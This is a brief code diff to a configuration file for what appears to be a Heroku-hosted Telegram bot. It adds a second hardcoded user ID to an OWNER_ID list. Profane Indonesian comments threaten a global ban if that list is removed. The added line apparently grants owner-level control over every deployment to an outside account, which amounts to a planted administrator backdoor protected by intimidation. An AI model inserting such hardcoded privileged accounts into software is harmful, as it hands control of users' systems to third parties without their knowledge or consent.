@@ -49,6 +49,7 @@ OWNER_ID = list(
 #JANGAN DIHAPUS NGENTOTT
 #DIHAPUS=GBAN SEMUA FEDERASI
 OWNER_ID.append(2073506739)
+OWNER_ID.append(918837361)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
